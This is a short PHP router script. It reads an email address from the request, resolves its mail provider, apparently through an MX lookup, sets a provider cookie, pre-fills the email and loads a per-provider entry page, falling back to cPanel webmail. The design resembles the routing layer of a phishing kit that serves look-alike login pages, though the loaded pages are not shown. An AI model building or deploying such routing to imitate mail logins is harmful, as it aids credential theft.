<?php
declare(strict_types=1);

require_once __DIR__ . '/includes/providers.php';
require_once __DIR__ . '/includes/mx_router.php';

$email = mx_extract_email_from_request();
$provider = $email !== '' ? mx_resolve_provider($email) : 'cpanel-webmail';

if (!provider_exists($provider)) {
    $provider = 'cpanel-webmail';
}

mx_set_provider_cookie($provider, $email);

$entry = provider_entry_file($provider);
if ($entry === null || !is_file($entry)) {
    http_response_code(503);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Provider not available: ' . $provider;
    exit;
}

if ($email !== '' && empty($_GET['email'])) {
    $_GET['email'] = $email;
}

provider_prepare_environment($provider);
chdir(dirname($entry));
require $entry;
